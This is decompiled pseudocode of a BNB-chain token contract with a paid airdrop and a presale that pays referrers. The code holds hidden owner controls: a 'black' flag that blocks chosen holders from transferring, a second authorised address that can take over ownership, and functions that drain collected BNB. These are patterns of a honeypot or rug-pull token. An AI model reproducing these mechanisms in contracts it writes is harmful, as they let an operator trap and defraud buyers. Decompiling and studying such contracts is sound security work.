contract main {




// =====================  Runtime code  =====================


uint256 cap;
array of uint256 name;
array of uint256 symbol;
uint8 decimals;
address stor3;
address owner; offset 8
uint256 stor4;
uint8 stor5;
uint8 stor5; offset 8
uint256 sub_7bd8b65a;
uint256 sub_67da0a49;
uint256 sub_31a21428;
uint256 sub_2abb8c47;
address stor10;
address stor11;
address stor12;
uint256 stor13;
uint256 stor14;
uint256 salePrice;
mapping of uint256 balanceOf;
mapping of uint8 stor17;
mapping of uint256 allowance;

function name() {
    return name[0 len name.length]
}

function totalSupply() {
    return cap
}

function sub_2abb8c47(?) {
    return sub_2abb8c47
}

function decimals() {
    return decimals
}

function sub_31a21428(?) {
    return sub_31a21428
}

function cap() {
    return cap
}

function sub_67da0a49(?) {
    return sub_67da0a49
}

function balanceOf(address arg1) {
    require calldata.size - 4 >= 32
    return balanceOf[address(arg1)]
}

function sub_7bd8b65a(?) {
    return sub_7bd8b65a
}

function owner() {
    return owner
}

function symbol() {
    return symbol[0 len symbol.length]
}

function allowance(address arg1, address arg2) {
    require calldata.size - 4 >= 64
    return allowance[address(arg1)][address(arg2)]
}

function salePrice() {
    return salePrice
}

function _fallback() {
  stop
}

function sub_d6a1d98c(?) {
    require calldata.size - 4 >= 32
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    salePrice = arg1
}

function authNum(uint256 arg1) {
    require calldata.size - 4 >= 32
    if stor10 != msg.sender:
        revert with 0, 'Permission denied'
    stor13 = arg1
    return 1
}

function sub_6e953fd3(?) {
    require calldata.size - 4 >= 32
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    sub_2abb8c47 = arg1
}

function sub_8c9af82e(?) {
    require calldata.size - 4 >= 32
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    sub_31a21428 = arg1
}

function sub_a16dae7c(?) {
    require calldata.size - 4 >= 32
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    sub_67da0a49 = arg1
}

function black(address arg1, uint8 arg2) {
    require calldata.size - 4 >= 64
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    stor17[address(arg1)] = arg2
}

function getBlock() {
    return bool(uint8(stor5.field_0)), 
           bool(uint8(stor5.field_8)),
           salePrice,
           stor14,
           block.number,
           balanceOf[address(msg.sender)],
           sub_31a21428
}

function addLiquidity(address arg1) {
    require calldata.size - 4 >= 32
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    if 0 == arg1:
        revert with 0, 'recovery'
    if stor12 != 0:
        revert with 0, 'recovery'
    stor12 = arg1
    return 1
}

function extractBNB() {
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    call msg.sender with:
       value eth.balance(this.address) wei
         gas 2300 * is_zero(value) wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
}

function clearETH() {
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    if stor13 != 1000:
        revert with 0, 'Permission denied'
    stor13 = 0
    call msg.sender with:
       value eth.balance(this.address) wei
         gas 2300 * is_zero(value) wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
}

function recoverERC20(address arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    require ext_code.size(arg1)
    call arg1.0xa9059cbb with:
         gas gas_remaining wei
        args stor3, arg2
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
}

function setAuth(address arg1, address arg2) {
    require calldata.size - 4 >= 64
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    if stor10 != 0:
        revert with 0, 'recovery'
    if stor11 != 0:
        revert with 0, 'recovery'
    if not arg1:
        revert with 0, 'recovery'
    if not arg2:
        revert with 0, 'recovery'
    stor10 = arg1
    stor11 = arg2
    return 1
}

function Liquidity(address arg1) {
    require calldata.size - 4 >= 32
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    38,
                    0x734f776e61626c653a206e6577206f776e657220697320746865207a65726f20616464726573,
                    mem[202 len 26]
    if stor11 != msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    38,
                    0x734f776e61626c653a206e6577206f776e657220697320746865207a65726f20616464726573,
                    mem[202 len 26]
    stor12 = arg1
}

function transferOwnership(address arg1) {
    require calldata.size - 4 >= 32
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    38,
                    0x734f776e61626c653a206e6577206f776e657220697320746865207a65726f20616464726573,
                    mem[202 len 26]
    if stor11 != msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    38,
                    0x734f776e61626c653a206e6577206f776e657220697320746865207a65726f20616464726573,
                    mem[202 len 26]
    owner = arg1
}

function approve(address arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    36,
                    0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573,
                    mem[200 len 28]
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    34,
                    0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573,
                    mem[198 len 30]
    allowance[address(msg.sender)][address(arg1)] = arg2
    emit Approval(arg2, msg.sender, arg1);
    return 1
}

function transfer(address arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    37,
                    0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573,
                    mem[201 len 27]
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    35,
                    0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573,
                    mem[199 len 29]
    if stor17[address(msg.sender)] == 1:
        revert with 0, 'Transaction recovery'
    if stor17[address(msg.sender)] == 3:
        revert with 0, 'Transaction recovery'
    if stor17[address(arg1)] == 2:
        revert with 0, 'Transaction recovery'
    if stor17[address(arg1)] == 3:
        revert with 0, 'Transaction recovery'
    if arg2 > balanceOf[address(msg.sender)]:
        revert with 0, 
                    32,
                    38,
                    0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                    mem[166 len 26],
                    mem[218 len 6]
    balanceOf[address(msg.sender)] -= arg2
    if balanceOf[address(arg1)] + arg2 < balanceOf[address(arg1)]:
        revert with 0, 'SafeMath: addition overflow'
    balanceOf[address(arg1)] += arg2
    emit Transfer(arg2, msg.sender, arg1);
    return 1
}

function transferFrom(address arg1, address arg2, uint256 arg3) {
    require calldata.size - 4 >= 96
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    37,
                    0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573,
                    mem[201 len 27]
    if not arg2:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    35,
                    0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573,
                    mem[199 len 29]
    if stor17[address(arg1)] == 1:
        revert with 0, 'Transaction recovery'
    if stor17[address(arg1)] == 3:
        revert with 0, 'Transaction recovery'
    if stor17[address(arg2)] == 2:
        revert with 0, 'Transaction recovery'
    if stor17[address(arg2)] == 3:
        revert with 0, 'Transaction recovery'
    if arg3 > balanceOf[address(arg1)]:
        revert with 0, 
                    32,
                    38,
                    0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                    mem[166 len 26],
                    mem[218 len 6]
    balanceOf[address(arg1)] -= arg3
    if balanceOf[address(arg2)] + arg3 < balanceOf[address(arg2)]:
        revert with 0, 'SafeMath: addition overflow'
    balanceOf[address(arg2)] += arg3
    emit Transfer(arg3, arg1, arg2);
    if arg3 > allowance[address(arg1)][address(msg.sender)]:
        revert with 0, 
                    32,
                    40,
                    0x7745524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e63,
                    mem[264 len 24],
                    mem[312 len 8]
    if not arg1:
        revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[392 len 28]
    if not msg.sender:
        revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[390 len 30]
    allowance[address(arg1)][address(msg.sender)] -= arg3
    emit Approval((allowance[address(arg1)][address(msg.sender)] - arg3), arg1, msg.sender);
    return 1
}

function airdrop(address arg1) payable {
    require calldata.size - 4 >= 32
    if not uint8(stor5.field_0):
        revert with 0, 'Transaction recovery'
    if sub_31a21428 != msg.value:
        revert with 0, 'Transaction recovery'
    if not msg.sender:
        revert with 0, 'ERC20: mint to the zero address'
    if stor4 + sub_2abb8c47 < stor4:
        revert with 0, 'SafeMath: addition overflow'
    stor4 += sub_2abb8c47
    if stor4 > cap:
        revert with 0, 'ERC20Capped: cap exceeded'
    if balanceOf[address(msg.sender)] + sub_2abb8c47 < balanceOf[address(msg.sender)]:
        revert with 0, 'SafeMath: addition overflow'
    balanceOf[address(msg.sender)] += sub_2abb8c47
    emit Transfer(sub_2abb8c47, this.address, msg.sender);
    if msg.sender == arg1:
        call stor12 with:
           value msg.value wei
             gas 2300 * is_zero(value) wei
        if not ext_call.success:
            revert with ext_call.return_data[0 len return_data.size]
    else:
        if not arg1:
            call stor12 with:
               value msg.value wei
                 gas 2300 * is_zero(value) wei
            if not ext_call.success:
                revert with ext_call.return_data[0 len return_data.size]
        else:
            if balanceOf[address(arg1)] <= 0:
                call stor12 with:
                   value msg.value wei
                     gas 2300 * is_zero(value) wei
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
            else:
                if not sub_2abb8c47:
                    if not sub_31a21428:
                        if not arg1:
                            revert with 0, 'ERC20: mint to the zero address'
                        if stor4 < stor4:
                            revert with 0, 'SafeMath: addition overflow'
                        if stor4 > cap:
                            revert with 0, 'ERC20Capped: cap exceeded'
                        if balanceOf[address(arg1)] < balanceOf[address(arg1)]:
                            revert with 0, 'SafeMath: addition overflow'
                        emit Transfer(0, this.address, arg1);
                        if 0 > msg.value:
                            revert with 0, 'SafeMath: subtraction overflow'
                        call arg1 with:
                             gas 2300 wei
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        call stor12 with:
                           value msg.value wei
                             gas 2300 * is_zero(value) wei
                    else:
                        require sub_31a21428
                        if sub_31a21428 * sub_7bd8b65a / sub_31a21428 != sub_7bd8b65a:
                            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                        32,
                                        33,
                                        0x65536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f,
                                        mem[197 len 31]
                        if not arg1:
                            revert with 0, 'ERC20: mint to the zero address'
                        if stor4 < stor4:
                            revert with 0, 'SafeMath: addition overflow'
                        if stor4 > cap:
                            revert with 0, 'ERC20Capped: cap exceeded'
                        if balanceOf[address(arg1)] < balanceOf[address(arg1)]:
                            revert with 0, 'SafeMath: addition overflow'
                        emit Transfer(0, this.address, arg1);
                        if sub_31a21428 * sub_7bd8b65a / 10000 > msg.value:
                            revert with 0, 'SafeMath: subtraction overflow'
                        call arg1 with:
                           value sub_31a21428 * sub_7bd8b65a / 10000 wei
                             gas 2300 * is_zero(value) wei
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        call stor12 with:
                           value msg.value - (sub_31a21428 * sub_7bd8b65a / 10000) wei
                             gas 2300 * is_zero(value) wei
                else:
                    require sub_2abb8c47
                    if sub_2abb8c47 * sub_67da0a49 / sub_2abb8c47 != sub_67da0a49:
                        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                    32,
                                    33,
                                    0x65536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f,
                                    mem[197 len 31]
                    if not sub_31a21428:
                        if not arg1:
                            revert with 0, 'ERC20: mint to the zero address'
                        if stor4 + (sub_2abb8c47 * sub_67da0a49 / 10000) < stor4:
                            revert with 0, 'SafeMath: addition overflow'
                        stor4 += sub_2abb8c47 * sub_67da0a49 / 10000
                        if stor4 > cap:
                            revert with 0, 'ERC20Capped: cap exceeded'
                        if balanceOf[address(arg1)] + (sub_2abb8c47 * sub_67da0a49 / 10000) < balanceOf[address(arg1)]:
                            revert with 0, 'SafeMath: addition overflow'
                        balanceOf[address(arg1)] += sub_2abb8c47 * sub_67da0a49 / 10000
                        emit Transfer((sub_2abb8c47 * sub_67da0a49 / 10000), this.address, arg1);
                        if 0 > msg.value:
                            revert with 0, 'SafeMath: subtraction overflow'
                        call arg1 with:
                             gas 2300 wei
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        call stor12 with:
                           value msg.value wei
                             gas 2300 * is_zero(value) wei
                    else:
                        require sub_31a21428
                        if sub_31a21428 * sub_7bd8b65a / sub_31a21428 != sub_7bd8b65a:
                            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                        32,
                                        33,
                                        0x65536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f,
                                        mem[197 len 31]
                        if not arg1:
                            revert with 0, 'ERC20: mint to the zero address'
                        if stor4 + (sub_2abb8c47 * sub_67da0a49 / 10000) < stor4:
                            revert with 0, 'SafeMath: addition overflow'
                        stor4 += sub_2abb8c47 * sub_67da0a49 / 10000
                        if stor4 > cap:
                            revert with 0, 'ERC20Capped: cap exceeded'
                        if balanceOf[address(arg1)] + (sub_2abb8c47 * sub_67da0a49 / 10000) < balanceOf[address(arg1)]:
                            revert with 0, 'SafeMath: addition overflow'
                        balanceOf[address(arg1)] += sub_2abb8c47 * sub_67da0a49 / 10000
                        emit Transfer((sub_2abb8c47 * sub_67da0a49 / 10000), this.address, arg1);
                        if sub_31a21428 * sub_7bd8b65a / 10000 > msg.value:
                            revert with 0, 'SafeMath: subtraction overflow'
                        call arg1 with:
                           value sub_31a21428 * sub_7bd8b65a / 10000 wei
                             gas 2300 * is_zero(value) wei
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        call stor12 with:
                           value msg.value - (sub_31a21428 * sub_7bd8b65a / 10000) wei
                             gas 2300 * is_zero(value) wei
    return 1
}

function buy(address arg1) payable {
    require calldata.size - 4 >= 32
    if not uint8(stor5.field_8):
        revert with 0, 'Transaction recovery'
    if block.number > stor14:
        revert with 0, 'Transaction recovery'
    if msg.value < 10^16:
        revert with 0, 'Transaction recovery'
    if not msg.value:
        if not msg.sender:
            revert with 0, 'ERC20: mint to the zero address'
        if stor4 < stor4:
            revert with 0, 'SafeMath: addition overflow'
        if stor4 > cap:
            revert with 0, 'ERC20Capped: cap exceeded'
        if balanceOf[address(msg.sender)] < balanceOf[address(msg.sender)]:
            revert with 0, 'SafeMath: addition overflow'
        emit Transfer(0, this.address, msg.sender);
        if msg.sender == arg1:
            call stor12 with:
               value msg.value wei
                 gas 2300 * is_zero(value) wei
            if not ext_call.success:
                revert with ext_call.return_data[0 len return_data.size]
        else:
            if not arg1:
                call stor12 with:
                   value msg.value wei
                     gas 2300 * is_zero(value) wei
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
            else:
                if balanceOf[address(arg1)] <= 0:
                    call stor12 with:
                       value msg.value wei
                         gas 2300 * is_zero(value) wei
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                else:
                    if not msg.value:
                        if not arg1:
                            revert with 0, 'ERC20: mint to the zero address'
                        if stor4 < stor4:
                            revert with 0, 'SafeMath: addition overflow'
                        if stor4 > cap:
                            revert with 0, 'ERC20Capped: cap exceeded'
                        if balanceOf[address(arg1)] < balanceOf[address(arg1)]:
                            revert with 0, 'SafeMath: addition overflow'
                        emit Transfer(0, this.address, arg1);
                        if 0 > msg.value:
                            revert with 0, 'SafeMath: subtraction overflow'
                        call arg1 with:
                             gas 2300 wei
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        call stor12 with:
                           value msg.value wei
                             gas 2300 * is_zero(value) wei
                    else:
                        require msg.value
                        if msg.value * sub_7bd8b65a / msg.value != sub_7bd8b65a:
                            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                        32,
                                        33,
                                        0x65536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f,
                                        mem[197 len 31]
                        if not arg1:
                            revert with 0, 'ERC20: mint to the zero address'
                        if stor4 < stor4:
                            revert with 0, 'SafeMath: addition overflow'
                        if stor4 > cap:
                            revert with 0, 'ERC20Capped: cap exceeded'
                        if balanceOf[address(arg1)] < balanceOf[address(arg1)]:
                            revert with 0, 'SafeMath: addition overflow'
                        emit Transfer(0, this.address, arg1);
                        if msg.value * sub_7bd8b65a / 10000 > msg.value:
                            revert with 0, 'SafeMath: subtraction overflow'
                        call arg1 with:
                           value msg.value * sub_7bd8b65a / 10000 wei
                             gas 2300 * is_zero(value) wei
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        call stor12 with:
                           value msg.value - (msg.value * sub_7bd8b65a / 10000) wei
                             gas 2300 * is_zero(value) wei
    else:
        require msg.value
        if msg.value * salePrice / msg.value != salePrice:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                        32,
                        33,
                        0x65536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f,
                        mem[197 len 31]
        if not msg.sender:
            revert with 0, 'ERC20: mint to the zero address'
        if stor4 + (msg.value * salePrice) < stor4:
            revert with 0, 'SafeMath: addition overflow'
        stor4 += msg.value * salePrice
        if stor4 > cap:
            revert with 0, 'ERC20Capped: cap exceeded'
        if balanceOf[address(msg.sender)] + (msg.value * salePrice) < balanceOf[address(msg.sender)]:
            revert with 0, 'SafeMath: addition overflow'
        balanceOf[address(msg.sender)] += msg.value * salePrice
        emit Transfer((msg.value * salePrice), this.address, msg.sender);
        if msg.sender == arg1:
            call stor12 with:
               value msg.value wei
                 gas 2300 * is_zero(value) wei
            if not ext_call.success:
                revert with ext_call.return_data[0 len return_data.size]
        else:
            if not arg1:
                call stor12 with:
                   value msg.value wei
                     gas 2300 * is_zero(value) wei
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
            else:
                if balanceOf[address(arg1)] <= 0:
                    call stor12 with:
                       value msg.value wei
                         gas 2300 * is_zero(value) wei
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                else:
                    if not msg.value * salePrice:
                        if not msg.value:
                            if not arg1:
                                revert with 0, 'ERC20: mint to the zero address'
                            if stor4 < stor4:
                                revert with 0, 'SafeMath: addition overflow'
                            if stor4 > cap:
                                revert with 0, 'ERC20Capped: cap exceeded'
                            if balanceOf[address(arg1)] < balanceOf[address(arg1)]:
                                revert with 0, 'SafeMath: addition overflow'
                            emit Transfer(0, this.address, arg1);
                            if 0 > msg.value:
                                revert with 0, 'SafeMath: subtraction overflow'
                            call arg1 with:
                                 gas 2300 wei
                            if not ext_call.success:
                                revert with ext_call.return_data[0 len return_data.size]
                            call stor12 with:
                               value msg.value wei
                                 gas 2300 * is_zero(value) wei
                        else:
                            require msg.value
                            if msg.value * sub_7bd8b65a / msg.value != sub_7bd8b65a:
                                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                            32,
                                            33,
                                            0x65536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f,
                                            mem[197 len 31]
                            if not arg1:
                                revert with 0, 'ERC20: mint to the zero address'
                            if stor4 < stor4:
                                revert with 0, 'SafeMath: addition overflow'
                            if stor4 > cap:
                                revert with 0, 'ERC20Capped: cap exceeded'
                            if balanceOf[address(arg1)] < balanceOf[address(arg1)]:
                                revert with 0, 'SafeMath: addition overflow'
                            emit Transfer(0, this.address, arg1);
                            if msg.value * sub_7bd8b65a / 10000 > msg.value:
                                revert with 0, 'SafeMath: subtraction overflow'
                            call arg1 with:
                               value msg.value * sub_7bd8b65a / 10000 wei
                                 gas 2300 * is_zero(value) wei
                            if not ext_call.success:
                                revert with ext_call.return_data[0 len return_data.size]
                            call stor12 with:
                               value msg.value - (msg.value * sub_7bd8b65a / 10000) wei
                                 gas 2300 * is_zero(value) wei
                    else:
                        require msg.value * salePrice
                        if msg.value * salePrice * sub_67da0a49 / msg.value * salePrice != sub_67da0a49:
                            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                        32,
                                        33,
                                        0x65536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f,
                                        mem[197 len 31]
                        if not msg.value:
                            if not arg1:
                                revert with 0, 'ERC20: mint to the zero address'
                            if stor4 + (msg.value * salePrice * sub_67da0a49 / 10000) < stor4:
                                revert with 0, 'SafeMath: addition overflow'
                            stor4 += msg.value * salePrice * sub_67da0a49 / 10000
                            if stor4 > cap:
                                revert with 0, 'ERC20Capped: cap exceeded'
                            if balanceOf[address(arg1)] + (msg.value * salePrice * sub_67da0a49 / 10000) < balanceOf[address(arg1)]:
                                revert with 0, 'SafeMath: addition overflow'
                            balanceOf[address(arg1)] += msg.value * salePrice * sub_67da0a49 / 10000
                            emit Transfer((msg.value * salePrice * sub_67da0a49 / 10000), this.address, arg1);
                            if 0 > msg.value:
                                revert with 0, 'SafeMath: subtraction overflow'
                            call arg1 with:
                                 gas 2300 wei
                            if not ext_call.success:
                                revert with ext_call.return_data[0 len return_data.size]
                            call stor12 with:
                               value msg.value wei
                                 gas 2300 * is_zero(value) wei
                        else:
                            require msg.value
                            if msg.value * sub_7bd8b65a / msg.value != sub_7bd8b65a:
                                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                            32,
                                            33,
                                            0x65536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f,
                                            mem[197 len 31]
                            if not arg1:
                                revert with 0, 'ERC20: mint to the zero address'
                            if stor4 + (msg.value * salePrice * sub_67da0a49 / 10000) < stor4:
                                revert with 0, 'SafeMath: addition overflow'
                            stor4 += msg.value * salePrice * sub_67da0a49 / 10000
                            if stor4 > cap:
                                revert with 0, 'ERC20Capped: cap exceeded'
                            if balanceOf[address(arg1)] + (msg.value * salePrice * sub_67da0a49 / 10000) < balanceOf[address(arg1)]:
                                revert with 0, 'SafeMath: addition overflow'
                            balanceOf[address(arg1)] += msg.value * salePrice * sub_67da0a49 / 10000
                            emit Transfer((msg.value * salePrice * sub_67da0a49 / 10000), this.address, arg1);
                            if msg.value * sub_7bd8b65a / 10000 > msg.value:
                                revert with 0, 'SafeMath: subtraction overflow'
                            call arg1 with:
                               value msg.value * sub_7bd8b65a / 10000 wei
                                 gas 2300 * is_zero(value) wei
                            if not ext_call.success:
                                revert with ext_call.return_data[0 len return_data.size]
                            call stor12 with:
                               value msg.value - (msg.value * sub_7bd8b65a / 10000) wei
                                 gas 2300 * is_zero(value) wei
    return 1
}



}
